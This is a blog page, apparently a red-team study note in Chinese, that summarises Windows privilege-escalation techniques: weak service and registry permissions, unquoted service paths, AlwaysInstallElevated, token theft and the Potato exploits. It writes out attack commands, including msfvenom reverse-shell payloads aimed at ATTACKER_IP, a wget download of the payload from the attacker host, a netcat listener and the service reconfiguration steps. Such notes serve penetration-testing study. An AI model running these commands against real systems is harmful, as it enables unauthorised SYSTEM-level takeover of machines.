@@ -1,0 +1,721 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="一：不安全的服务权限基础知识：应用软件注册服务时会在本地注册一些服务，并且大多数服务在计算机开机的时候以系统SYSTEM启动。服务创建时，会在此创建注册表项。HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services 对于权限查找，我们可以用微软提供的AccessChk工具。低权限用户可以检查Authenticated Users和INTERACTIV">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows提权总结">
+<meta property="og:url" content="http://example.com/2024/01/30/Windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="一：不安全的服务权限基础知识：应用软件注册服务时会在本地注册一些服务，并且大多数服务在计算机开机的时候以系统SYSTEM启动。服务创建时，会在此创建注册表项。HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services 对于权限查找，我们可以用微软提供的AccessChk工具。低权限用户可以检查Authenticated Users和INTERACTIV">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/WindowsPrivilegeEscalation/24EFBB70AA224B8AB384FBA6035D4EFA.png">
+<meta property="og:image" content="http://example.com/WindowsPrivilegeEscalation/C01F3D4C21C1442080A10C3D521C179F.png">
+<meta property="og:image" content="http://example.com/WindowsPrivilegeEscalation/DE34FAF2CD2A46CFB71268F8AAD9ECE6.png">
+<meta property="og:image" content="http://example.com/WindowsPrivilegeEscalation/DDDB8387370A4D13A8CE6D37CED1C7A7.png">
+<meta property="og:image" content="http://example.com/WindowsPrivilegeEscalation/45CF62647CB64383B79118B464B4370D.png">
+<meta property="og:image" content="http://example.com/WindowsPrivilegeEscalation/710CAF95B9B749E8AE7E43F5C65087FF.png">
+<meta property="og:image" content="http://example.com/WindowsPrivilegeEscalation/97674FFB52774C08B1B78B538D28FCC7.png">
+<meta property="og:image" content="http://example.com/WindowsPrivilegeEscalation/819550D8434C42259CF1B1C7C9CDABD4.png">
+<meta property="og:image" content="http://example.com/WindowsPrivilegeEscalation/1D3E261E992F4EF09C2DA685E1F4BAD1.png">
+<meta property="article:published_time" content="2024-01-30T07:34:35.000Z">
+<meta property="article:modified_time" content="2024-01-30T13:47:02.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="red team">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/WindowsPrivilegeEscalation/24EFBB70AA224B8AB384FBA6035D4EFA.png">
+  
+  
+  
+  <title>Windows提权总结 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Windows提权总结"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-30 15:34" pubdate>
+          January 30, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.1k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          27 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Windows提权总结</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="一：不安全的服务权限"><a href="#一：不安全的服务权限" class="headerlink" title="一：不安全的服务权限"></a>一：不安全的服务权限</h1><p>基础知识：<br>应用软件注册服务时会在本地注册一些服务，并且大多数服务在计算机开机的时候以系统SYSTEM启动。<br>服务创建时，会在此创建注册表项。<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services</p>
+<p>对于权限查找，我们可以用微软提供的AccessChk工具。<br>低权限用户可以检查Authenticated Users和INTERACTIVE组队系统服务的权限。<br>前者为经过身份验证的用户，包含系统中所有使用用户名，密码登陆并通过身份验证的账户。</p>
+<p>后者为交互式用户组。包含系统中直接登陆到计算机进行操作的用户。<br>默认情况下这两个组均为Users组成员。</p>
+<h2 id="1-不安全的服务配置权限"><a href="#1-不安全的服务配置权限" class="headerlink" title="1.不安全的服务配置权限"></a>1.不安全的服务配置权限</h2><p>利用微软的工具accessChk.exe查找服务。<br>accesschk.exe &#x2F;accepteula -uwcqv “Authenticated Users” *<br>假如我们对InsproSvc服务拥有SERVICE_CHANGE_CONFIG权限：</p>
+<p>*注意binpath后的空格<br>sc config InsproSbc binpath&#x3D; “cmd.exe &#x2F;k reverse_tcp.exe”</p>
+<p>如果还有SERVICE_STOP和SERVICE_START<br>可以直接<br>sc stop name<br>sc start name</p>
+<h2 id="2-不安全的注册表权限"><a href="#2-不安全的注册表权限" class="headerlink" title="2.不安全的注册表权限"></a>2.不安全的注册表权限</h2><p>*注：这个和上一个不一样，是通过注册表修改ImagePath<br>accesschk.exe &#x2F;accepteula -uvwqk “Authenticated Users” HKLM\SYSTEM\CurrentControlSet\Services</p>
+<p>假如我们对某服务注册表有KEY_ALL_ACCESS权限。<br>reg add HKLM_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RegSvc &#x2F;v ImagePath &#x2F;t REG_EXPAND_SZ &#x2F;d “cmd.exe &#x2F;k reverse_tcp” &#x2F;f</p>
+<p>查看是否有重启权限：<br>accesschk.exe &#x2F;accepteula -ucqv “Authenticated Users” some_services</p>
+<p>*根据目标机软件提权：<br>查看安装在目标机的软件：<br>wmic product get name,version,vendor<br>*需要一分钟的时间。</p>
+<p>wmic product可能不会返回所有安装的项目。<br>除此之外推荐检查桌面的shortcuts。可用的服务等。</p>
+<p>完事后，我们就可以通过exploit-db或者google搜索exp。</p>
+<p>metasploit：<br>在获取了meterpreter shell之后：<br>可以用multi&#x2F;recon&#x2F;local_exploit_suggester 模块枚举。</p>
+<h2 id="3-服务路径权限可控"><a href="#3-服务路径权限可控" class="headerlink" title="3.服务路径权限可控"></a>3.服务路径权限可控</h2><p>accesschk.exe &#x2F;accepteula -quv “C:\目录”<br>假如拥有FILE_ALL_ACCESS权限。<br>然后参考下面的即可</p>
+<p>*自动化工具利用：<br>如果不用access查看，可以用winpeas一把嗦查找服务<br>或者使用powerup<br>这几个更方便。</p>
+<p>查找到：<br>例如，我们有一个WindowsScheduler的服务。<br>sc qc WindowsScheduler:<br><img src="/../WindowsPrivilegeEscalation/24EFBB70AA224B8AB384FBA6035D4EFA.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>然后看一下WService.exe文件：<br><img src="/../WindowsPrivilegeEscalation/C01F3D4C21C1442080A10C3D521C179F.png" srcset="/img/loading.gif" lazyload alt="img"><br>可以看到所有都有M权限。我们可以轻易修改这个文件：<br>攻击机生成一个rev-svc.exe<br>msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcpLHOST&#x3D;ATTACKER_IPLPORT&#x3D;4445-f exe-service -o rev-svc.exe</p>
+<p>python -m http.server</p>
+<p>利用powreshell获取：<br>wget <a target="_blank" rel="noopener" href="http://attacker_ip:8000/rev-svc.exe">http://attacker_ip:8000/rev-svc.exe</a> -O rev-svc.exe</p>
+<p><img src="/../WindowsPrivilegeEscalation/DE34FAF2CD2A46CFB71268F8AAD9ECE6.png" srcset="/img/loading.gif" lazyload alt="img"><br>挪到下面，然后授予F权限（F， 完全控制，见最后一行）</p>
+<p>在攻击机监听： nc -lvvp 4445</p>
+<p>sc stop windowsscheduler<br>sc start windowsscheduler<br>重启下服务。</p>
+<p>如果使用powershell，请用Set-Content代替sc，或者sc.exe代替sc</p>
+<p>这样就提升到root权限了。</p>
+<h2 id="4：未引用的服务路径（Unquoted-Services）"><a href="#4：未引用的服务路径（Unquoted-Services）" class="headerlink" title="4：未引用的服务路径（Unquoted Services）"></a>4：未引用的服务路径（Unquoted Services）</h2><p>查找：<br>wmic service get DisplayName, PathName, StartMode |findstr &#x2F;i &#x2F;v “C:\Windows\“ | findstr &#x2F;i &#x2F;v “””</p>
+<p>假如我们找到了：C:\Program Files\Unquoted Path\Sub dir\This_is_a_fucking_unquoted_service.exe</p>
+<p>检查用户是否有权限：(一级一级查看，先查看最上面的)<br>accesschk.exe &#x2F;accepteula &#x2F;quv “Authenticated Users” “C:\Program Files\Unquoted Path&quot;<br>然后 </p>
+<p>例如：<br><img src="/../WindowsPrivilegeEscalation/DDDB8387370A4D13A8CE6D37CED1C7A7.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>利用msfvenom生成反弹shell并传过去。<br>放在C:\MyPrograms\Disk.exe</p>
+<p>icacls C:\MyPrograms\Disk.exe &#x2F;grant Everyone:F</p>
+<p><img src="/../WindowsPrivilegeEscalation/45CF62647CB64383B79118B464B4370D.png" srcset="/img/loading.gif" lazyload alt="img"><br>重启服务。</p>
+<p>或者直接shutdown -r -t 0<br>监听端口。拿到shell。</p>
+<p>*上述都在powerup工具中完成了集成。</p>
+<h1 id="二：MSI安装策略提权"><a href="#二：MSI安装策略提权" class="headerlink" title="二：MSI安装策略提权"></a>二：MSI安装策略提权</h1><p>MSI安装策略提权，如果用户配置MSI安装策略，启用了“永远以搞特权进行安装”<br>AlwaysInstallElevated(默认情况下为禁用)<br>使得任何权限的用户都可以通过SYSTEM权限安装MSI（类似于SUID）<br>那么可以制作恶意msi文件进行提权。</p>
+<p>MSI(Microsoft Installer)是微软格式的应用程序安装包。</p>
+<p>确定是否存在漏洞：<br>查看注册表：</p>
+<p>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</p>
+<p>reg query HKCU\SOFTWARE\Polices\Microsoft\Windows\Installer &#x2F;v AlwaysInstallElevated</p>
+<p>利用msfvenom生成恶意msi文件：<br>msfvenom -p windows&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;lateralmovement LPORT&#x3D;4445-f msi&gt;myinstaller.msi</p>
+<p>可以利用meterpreter上传</p>
+<p>安装：<br>msiexec &#x2F;quiet &#x2F;qn &#x2F;i myinstall.msi<br>#&#x2F;quiet 安装期间禁止向用户发消息。<br>#&#x2F;qn 无GUI模式允许<br>#&#x2F;i 常规安装。</p>
+<h1 id="三：访问令牌操纵"><a href="#三：访问令牌操纵" class="headerlink" title="三：访问令牌操纵"></a>三：访问令牌操纵</h1><p>Windows访问控制模型：(Access Control Model)<br>由访问令牌（Access Token）, 安全描述符（Security Descriptor）两部分组成。<br>二者分别被访问者和被访问者拥有。通过比较访问令牌和安全描述符。windows可以对访问者是否有权限访问某资源判定。</p>
+<p>通过操纵访问令牌，使正在运行的进程看起来是其他进程的子进程或属于其他用户所启动的进程，这常常使用内置的Windows API<br>从指定的进程中复制访问令牌，并将得到的访问令牌用于现有进程或生成新进程<br>从而达到权限提升并绕过访问控制的目的，称为：令牌窃取</p>
+<p>利用条件：需要特权用户。因为通过令牌创建进程使用的<br>CreateProcessWithTokenW &amp; CreateProcessAsUserA两个Windows API分别要求用户必须拥有：<br>SeImpersonatePrivilate和SeAssignPrimaryTOkenPrivilege&#x2F;SeIncreateQuotaPrivilege特权。</p>
+<p>拥有这两个的一般为：管理员账户，网络服务账户或者系统服务账户（如MSSQL， IIS）</p>
+<p>可以上传incognito.exe进行令牌窃取。<br>第二种就是：meterpreter自带incognito</p>
+<p>load incognito<br>use incognito<br>list_tokens -u<br><img src="/../WindowsPrivilegeEscalation/710CAF95B9B749E8AE7E43F5C65087FF.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>impersonate_token “xxx”  #窃取xx的令牌<br>steal_token &lt;PID&gt;  #从进程窃取令牌<br>如果要切回自己的权限：rev2self</p>
+<p>通过令牌获取TrustedInstaller权限：<br>通常认为，SYSTEM权限为Windows系统中的最高权限，但是即便获取了SYSTEM也不能修改windows系统文件。如C:\Windows\servicing目录。</p>
+<p>但其实通过icacls查看该目录，NT SERVICE\TrustedInstaller账户对其具有完全控制权限。<br>总Windows Vista开始系统内置了这么一个安全主体，拥有修改系统文件权限，专门用于系统进行维护更新。<br>通常以一个账户组出现：NT SERVICE\TrustedInstaller</p>
+<p>TrustedInstall本质上是个服务，启动该服务会运行TrustedInstaller.exe 该程序在胸上的路径为：<br>“C:\Windows\servicing\TrustedInstaller.exe” 其拥有者为NT SERVICE\TrustedInstaller</p>
+<p>可以通过窃取这个令牌获取TrustedInstaller权限。（Higher than SYSTEM!）</p>
+<p>利用条件：SYSTEM权限。<br><img src="/../WindowsPrivilegeEscalation/97674FFB52774C08B1B78B538D28FCC7.png" srcset="/img/loading.gif" lazyload alt="img"><br>如图，虽然不会显示TrustedInstaller，但是实际上是有这个权限的</p>
+<p>小总结：<br>windows中权限依次提升顺序为：<br>Nomal Users –&gt; Administrators –&gt; SYSTEM –&gt; TrustedInstaller</p>
+<p>比较快捷的思路：我们可以在管理员的权限创建恶意服务，提升到SYSTEM，最后利用访问令牌窃取到TrustedInstaller最高权限。<br>恶意服务提升至SYSTEM，更多见权限维持篇。权限维持篇是以Administrator为基础展开。</p>
+<ul>
+<li>事实上拿到Administrator，可以直接用meterpreter的getsystem。meterpreter已经集成了这个功能。</li>
+</ul>
+<h1 id="四：Potato家族提权"><a href="#四：Potato家族提权" class="headerlink" title="四：Potato家族提权"></a>四：Potato家族提权</h1><h2 id="Rotten-Potato-MS16-075"><a href="#Rotten-Potato-MS16-075" class="headerlink" title="Rotten Potato(MS16-075)"></a>Rotten Potato(MS16-075)</h2><p>只针对本地用户，不针对域用户。<br>适用版本：win 7 8 10 2008 2012</p>
+<p>原理：<br>1：欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。<br>2：对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。<br>3：模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。</p>
+<p>上传rottenpotato.exe到攻击机。<br>meterpreter执行：execute -Hc -f rottenpotato.exe</p>
+<p>此时执行list_tokens -u 就可以看到SYSTEM的凭证了。<br>之后正常进行令牌窃取就可。</p>
+<h2 id="JuicyPotato-MS-16-075-extend"><a href="#JuicyPotato-MS-16-075-extend" class="headerlink" title="JuicyPotato(MS-16-075 extend)"></a>JuicyPotato(MS-16-075 extend)</h2><p>使用原作者的ps1脚本查一下COM对象<br><img src="/../WindowsPrivilegeEscalation/819550D8434C42259CF1B1C7C9CDABD4.png" srcset="/img/loading.gif" lazyload alt="img"><br>或者自己手动查。<br>再用这个：<br><img src="/../WindowsPrivilegeEscalation/1D3E261E992F4EF09C2DA685E1F4BAD1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>*这个作者还有一个webshell的juicypotato非常好用。</p>
+<p>提权命令：<br>Potato.exe -t t -p C:\Users\Public\Desktop\shell.exe -l 6666 -n 135 -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}</p>
+<p>*-p参数改为反弹shell路径也可。<br>-t 指定要使用CreateProcessWithTokenW &#x2F; CreateProcessAsUserA()<br>哪个函数创建进程。</p>
+<p>-n 指定本地RPC服务端口，默认135。 -c 指定要加载对象的CLSID。</p>
+<p>利用条件：<br>需要支持SeImpersonate或者SeAssignPrimaryToken权限（通常情况下IIS、MSSQL或者其他服务账户具有这两个权限）<br>开启DCOM<br>本地支持RPC或者远程服务器支持PRC并能成功登录<br>能够找到可用的COM对象</p>
+<p>windows版本：<br>windows &lt; windows 10 version 1809<br>windows server &lt; Windows Server 2019</p>
+<p>什么是DCOM：<br>DCOM（Distributed Component Object Model）是一种用于在分布式计算环境中进行组件通信的技术，特别是在Windows操作系统中广泛使用。DCOM是微软的COM（Component Object Model）的分布式版本，它允许在网络上的不同计算机上的组件之间进行通信和交互。<br>以下是关于DCOM在Windows中的一些关键概念：<br>组件（Component）：组件是应用程序的可重用部分，可以包括对象、库和服务。这些组件可以在不同计算机上运行，并且可以通过DCOM进行通信。<br>COM 对象（COM Objects）：COM（Component Object Model）对象是Windows中的可编程对象，具有公开的接口，可以通过这些接口与其他对象进行通信。COM对象是DCOM的基础。<br>分布式：DCOM允许在网络上的不同计算机上运行的COM对象进行通信。这使得分布式应用程序开发变得更加容易，因为您可以将组件部署在不同的计算机上，并通过网络进行通信。<br>接口（Interfaces）：COM对象通过公开接口来定义其功能。其他对象可以通过调用这些接口上的方法来与COM对象进行通信。<br>远程过程调用（RPC）：DCOM使用RPC技术来实现远程对象之间的通信。它允许对象在不同计算机上执行方法调用，就像它们在同一台计算机上一样。<br>注册表（Registry）：DCOM信息通常在Windows注册表中注册，这包括COM对象的 CLSID（Class Identifier）和接口的 IID（Interface Identifier）等信息。这使得系统能够查找和调用正确的组件。<br>安全性：DCOM提供了一些安全机制，如身份验证和授权，以确保只有经过授权的应用程序可以访问远程对象。</p>
+<p>如何查看DCOM是否开启：<br>dcomcnfg.exe &#x2F;Query<br>*windows server 2012是默认开启的。</p>
+<p>原理：<br>其实和Rotten差不多，是在其进行的扩展。比rotten更广泛使用：<br>· LocalService用户默认具有SeImpersonate和SeAssignPrimaryToken权限<br>· 开启SeImpersonate权限后，能够在调用CreateProcessWithToken时，传入新的Token创建新的进程<br>· 开启SeAssignPrimaryToken权限后，能够在调用CreateProcessAsUser时，传入新的Token创建新的进程<br>Juicy Potato的实现流程如下：<br>1、加载COM，发出请求，权限为System<br>在指定ip和端口的位置尝试加载一个COM对象。<br>RottenPotatoNG使用的COM对象为BITS，CLSID为{4991d34b-80a1-4291-83b6-3328366b9097}<br>可供选择的COM对象不唯一，Juicy Potato提供了多个，详细列表可参考如下地址：<br><a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a><br>2、回应步骤1的请求，发起NTLM认证<br>正常情况下，由于权限不足，当前权限不是System，无法认证成功。<br>3、针对本地端口，同样发起NTLM认证，权限为当前用户<br>由于权限为当前用户，所以NTLM认证能够成功完成。<br>RottenPotatoNG使用的135端口。<br>Juicy Potato支持指定任意本地端口，但是RPC一般默认为135端口，很少被修改。<br>4、分别拦截两个NTLM认证的数据包，替换数据，通过NTLM重放使得步骤1(权限为System)的NTLM认证通过，获得System权限的Token<br>重放时需要注意NTLM认证的NTLM Server Challenge不同，需要修正。<br>5、利用System权限的Token创建新进程<br>如果开启SeImpersonate权限，调用CreateProcessWithToken，传入System权限的Token，创建的进程为System权限。<br>如果开启SeAssignPrimaryToken权限，调用CreateProcessAsUser，传入System权限的Token，创建的进程为System权限</p>
+<p>*实验小结：<br>其实用了juicy的检查对象ps1脚本，第二个就是DCOM中的BIT对象。</p>
+<h2 id="3-PrintSpoofer-Pipe-Potato"><a href="#3-PrintSpoofer-Pipe-Potato" class="headerlink" title="3 PrintSpoofer(Pipe Potato)"></a>3 PrintSpoofer(Pipe Potato)</h2><p>PrintSpoofer64.exe -i -c cmd</p>
+<p>打印机漏洞<br>漏洞原理：<br>不看了，看不太懂。</p>
+<p>影响版本：<br>* Windows Server 2019 (Server Core installation)<br>* Windows Server 2012 R2 (Server Core installation)<br>* Windows Server 2012 R2<br>* Windows Server 2012 (Server Core installation)<br>* Windows Server 2012<br>* Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)<br>* Windows RT 8.1<br>* Windows 8.1 for x64-based systems<br>* Windows 8.1 for 32-bit systems<br>* Windows 7 for x64-based Systems Service Pack 1<br>* Windows 7 for 32-bit Systems Service Pack 1<br>* Windows 10 Version 1607 for x64-based Systems<br>* Windows 10 Version 1607 for 32-bit Systems</p>
+<h2 id="4：SweetPotato-集成工具"><a href="#4：SweetPotato-集成工具" class="headerlink" title="4：SweetPotato(集成工具)"></a>4：SweetPotato(集成工具)</h2><p>见sweetpotato.exe or github</p>
+<h1 id="其他大漏洞"><a href="#其他大漏洞" class="headerlink" title="其他大漏洞"></a>其他大漏洞</h1><h2 id="1-HiveNightmare-CVE-2021-36934"><a href="#1-HiveNightmare-CVE-2021-36934" class="headerlink" title="1:HiveNightmare(CVE-2021-36934)"></a>1:HiveNightmare(CVE-2021-36934)</h2><p>标准用户未授权读取系统文件，可进行哈希传递攻击或暴力破解攻击。</p>
+<p>影响版本：windows 10 version 1809以前所有版本。</p>
+<p>工具：见github。</p>
+<h2 id="2：Zerologin-CVE-2020-1472"><a href="#2：Zerologin-CVE-2020-1472" class="headerlink" title="2：Zerologin(CVE-2020-1472)"></a>2：Zerologin(CVE-2020-1472)</h2><p>域内提权漏洞，可以重置域控密码。</p>
+<p>工具：直接搜cve-2020-1472-exploit.py</p>
+<p>mimikatz也集成了该模块。</p>
+<h2 id="3：Print-Spooler系列漏洞"><a href="#3：Print-Spooler系列漏洞" class="headerlink" title="3：Print Spooler系列漏洞"></a>3：Print Spooler系列漏洞</h2><p>这个是windows的打印后台处理服务，控制打印工作。该服务默认开启。</p>
+<h3 id="PrintDemon-CVE-2020-1048"><a href="#PrintDemon-CVE-2020-1048" class="headerlink" title="PrintDemon(CVE-2020-1048)"></a>PrintDemon(CVE-2020-1048)</h3><h3 id="PrintNightmare-CVE-2021-1675-CVE-2021-34527"><a href="#PrintNightmare-CVE-2021-1675-CVE-2021-34527" class="headerlink" title="PrintNightmare(CVE-2021-1675 &#x2F; CVE-2021-34527)"></a>PrintNightmare(CVE-2021-1675 &#x2F; CVE-2021-34527)</h3><p>一个是权限提升，另一个是RCE</p>
+<p>这些都在metasploit中集成了。</p>
+<h2 id="4：Nopac域内提取"><a href="#4：Nopac域内提取" class="headerlink" title="4：Nopac域内提取"></a>4：Nopac域内提取</h2><p>和kerberoas协议有关。(CVE-2022-26923)</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/red-team/" class="print-no-link">#red team</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Windows提权总结</div>
+      <div>http://example.com/2024/01/30/Windows提权总结/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>January 30, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/01/30/Linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/30/Apache-Dubbo-%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
